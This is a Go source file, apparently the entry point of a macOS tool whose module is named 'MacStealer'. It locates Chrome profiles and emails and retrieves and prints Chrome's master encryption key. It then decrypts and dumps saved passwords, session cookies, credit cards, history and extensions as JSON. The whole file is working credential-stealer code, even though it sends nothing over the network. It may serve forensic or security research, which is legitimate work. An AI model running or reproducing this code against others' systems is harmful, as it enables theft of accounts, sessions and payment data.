package main

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/ultra-supara/MacStealer/browsingdata"
	"github.com/ultra-supara/MacStealer/masterkey"
)

func getChromeBasePath() string {
	usr, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}
	return filepath.Join(usr.HomeDir, "Library/Application Support/Google/Chrome")
}

func getDefaultPath(kind string, profile string) string {
	basePath := filepath.Join(getChromeBasePath(), profile)
	switch kind {
	case "cookie":
		return filepath.Join(basePath, "Cookies")
	case "logindata":
		return filepath.Join(basePath, "Login Data")
	case "creditcard":
		return filepath.Join(basePath, "Web Data")
	case "history":
		return filepath.Join(basePath, "History")
	case "extension":
		return filepath.Join(basePath, "Preferences")
	default:
		return ""
	}
}

// ProfileInfo holds Chrome profile information
type ProfileInfo struct {
	Name        string `json:"name"`
	ProfilePath string `json:"profile_path"`
	Email       string `json:"email,omitempty"`
}

// listProfiles returns all available Chrome profiles
func listProfiles() ([]ProfileInfo, error) {
	chromeBase := getChromeBasePath()

	entries, err := os.ReadDir(chromeBase)
	if err != nil {
		return nil, fmt.Errorf("failed to read Chrome directory: %w", err)
	}

	var profiles []ProfileInfo

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}

		name := entry.Name()
		// Check if it's a profile directory (Default or Profile N)
		if name != "Default" && !strings.HasPrefix(name, "Profile ") {
			continue
		}

		prefPath := filepath.Join(chromeBase, name, "Preferences")
		if _, err := os.Stat(prefPath); os.IsNotExist(err) {
			continue
		}

		profile := ProfileInfo{
			ProfilePath: name,
		}

		// Try to read profile name from Preferences
		data, err := os.ReadFile(prefPath)
		if err == nil {
			var prefs map[string]interface{}
			if json.Unmarshal(data, &prefs) == nil {
				if profileData, ok := prefs["profile"].(map[string]interface{}); ok {
					if profileName, ok := profileData["name"].(string); ok {
						profile.Name = profileName
					}
				}
				if accountInfo, ok := prefs["account_info"].([]interface{}); ok && len(accountInfo) > 0 {
					if firstAccount, ok := accountInfo[0].(map[string]interface{}); ok {
						if email, ok := firstAccount["email"].(string); ok {
							profile.Email = email
						}
					}
				}
			}
		}

		profiles = append(profiles, profile)
	}

	return profiles, nil
}

func main() {
	// Check architecture - only allow Apple Silicon (arm64)
	if runtime.GOARCH != "arm64" {
		log.Fatal("This tool only runs on Apple Silicon Macs (M1 or later)")
	}

	// Parse cli options
	kind := flag.String("kind", "", "cookie, logindata, creditcard, history, or extension")
	localState := flag.String("localstate", "", "(optional) Chrome Local State file path")
	sessionstorage := flag.String("sessionstorage", "", "(optional) Chrome Sesssion Storage on Keychain (Mac only)")
	targetPath := flag.String("targetpath", "", "(optional) File path of the kind (Cookies or Login Data)")
	profile := flag.String("profile", "Default", "(optional) Chrome profile name (e.g., 'Default', 'Profile 1')")
	listProfilesFlag := flag.Bool("list-profiles", false, "List all available Chrome profiles")

	flag.Parse()

	// Handle -list-profiles flag
	if *listProfilesFlag {
		profiles, err := listProfiles()
		if err != nil {
			log.Fatalf("Failed to list profiles: %v", err)
		}

		fmt.Println("Available Chrome Profiles:")
		fmt.Println("==========================")
		for i, p := range profiles {
			fmt.Printf("%d. %s\n", i+1, p.ProfilePath)
			if p.Name != "" {
				fmt.Printf("   Name: %s\n", p.Name)
			}
			if p.Email != "" {
				fmt.Printf("   Email: %s\n", p.Email)
			}
			fmt.Println()
		}
		fmt.Println("Usage: Use -profile \"Profile 1\" to specify a profile")
		os.Exit(0)
	}

	if *kind == "" {
		flag.Usage()
		os.Exit(1)
	}

	// Set default path if not specified
	path := *targetPath
	if path == "" {
		path = getDefaultPath(*kind, *profile)
		if path == "" {
			log.Fatal("Invalid kind specified")
		}
	}

	// Get Chrome's master key
	var decryptedKey string
	if *sessionstorage == "" {
		// Default path to get master key
		k, err := masterkey.GetMasterKey(*localState)
		if err != nil {
			log.Fatalf("Failed to get master key: %v", err)
		}
		decryptedKey = base64.StdEncoding.EncodeToString(k)
	} else if runtime.GOOS == "darwin" {
		// User input seed key in keychain
		b, err := masterkey.KeyGeneration([]byte(*sessionstorage))
		if err != nil {
			log.Fatalf("Failed to get master key: %v", err)
		}
		decryptedKey = base64.StdEncoding.EncodeToString(b)
	}
	fmt.Println("Master Key: " + decryptedKey)

	// Get Decrypted Data
	log.SetOutput(os.Stderr)
	switch *kind {
	case "cookie":
		c, err := browsingdata.GetCookie(decryptedKey, path)
		if err != nil {
			log.Fatalf("Failed to get logain data: %v", err)
		}
		output := struct {
			Cookies []browsingdata.Cookie `json:"cookies"`
		}{
			Cookies: c,
		}

		encoder := json.NewEncoder(os.Stdout)
		encoder.SetIndent("", "  ")
		if err := encoder.Encode(output); err != nil {
			log.Fatalf("Failed to encode cookie data: %v", err)
		}

	case "logindata":
		ld, err := browsingdata.GetLoginData(decryptedKey, path)
		if err != nil {
			log.Fatalf("Failed to get login data: %v", err)
		}
		for _, v := range ld {
			j, _ := json.Marshal(v)
			fmt.Println(string(j))
		}

	case "creditcard":
		cc, err := browsingdata.GetCreditCard(decryptedKey, path)
		if err != nil {
			log.Fatalf("Failed to get credit card data: %v", err)
		}
		output := struct {
			CreditCards []browsingdata.CreditCard `json:"credit_cards"`
		}{
			CreditCards: cc,
		}

		encoder := json.NewEncoder(os.Stdout)
		encoder.SetIndent("", "  ")
		if err := encoder.Encode(output); err != nil {
			log.Fatalf("Failed to encode credit card data: %v", err)
		}

	case "history":
		h, err := browsingdata.GetHistory(path)
		if err != nil {
			log.Fatalf("Failed to get history data: %v", err)
		}
		output := struct {
			History []browsingdata.History `json:"history"`
		}{
			History: h,
		}

		encoder := json.NewEncoder(os.Stdout)
		encoder.SetIndent("", "  ")
		if err := encoder.Encode(output); err != nil {
			log.Fatalf("Failed to encode history data: %v", err)
		}

	case "extension":
		ext, err := browsingdata.GetExtension(path)
		if err != nil {
			log.Fatalf("Failed to get extension data: %v", err)
		}
		output := struct {
			Extensions []browsingdata.Extension `json:"extensions"`
		}{
			Extensions: ext,
		}

		encoder := json.NewEncoder(os.Stdout)
		encoder.SetIndent("", "  ")
		if err := encoder.Encode(output); err != nil {
			log.Fatalf("Failed to encode extension data: %v", err)
		}

	default:
		fmt.Println("Failed to get kind")
		os.Exit(1)
	}
}
